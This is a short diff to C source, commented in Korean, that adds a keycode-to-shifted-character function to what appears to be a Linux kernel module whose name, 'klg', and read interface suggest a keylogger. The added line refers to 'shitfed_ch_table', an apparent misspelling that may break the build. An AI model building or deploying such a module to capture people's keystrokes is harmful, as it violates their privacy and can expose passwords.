@@ -32,7 +32,12 @@ inline char get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값�
 	
 	return ch_table[(code-FIRST_CD)]; //해당 문자를 반환
 }
+inline char shifted_get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
+	if ((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //만약에 범위 외의 문자라면 X를 반환
+	else if (code == KEY_SPACE) return ' '; //스페이스라면 공백을 반환
 
+	return shitfed_ch_table[(code - FIRST_CD)]; //해당 문자를 반환
+}
 int klg_open(struct inode *inode, struct file *filp); //klg_open 함수 선언
 ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos); //klg_read함수 선언
 void klg_exit(void); //klg_exit함수 선언
